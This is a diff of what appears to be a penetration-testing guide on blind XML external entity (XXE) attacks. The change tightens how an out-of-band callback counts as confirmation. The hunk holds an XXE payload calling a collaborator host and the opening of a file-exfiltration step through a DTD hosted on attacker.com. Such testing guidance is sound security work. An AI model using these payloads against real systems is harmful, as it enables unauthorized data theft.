@@ -48,7 +48,7 @@ Use when direct entity reflection fails (server parses but doesn't echo entity c
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/">]>
 <root>&xxe;</root>
 ```
-DNS/HTTP hit to collaborator → confirms XXE (even if no file content returned).
+A DNS/HTTP hit is an OOB signal. Use a unique marker and a control without external-entity expansion to attribute the callback to the target's server-side entity parser, excluding scanners/previews or ordinary URL fetching. This can confirm blind XXE without file contents; internal/file impact still needs its own evidence. Unattributed callbacks remain unverified.
 
 ### Step 2: OOB file exfiltration via attacker-hosted DTD
 **Attacker's server hosts a malicious DTD** at `http://attacker.com/evil.dtd`:
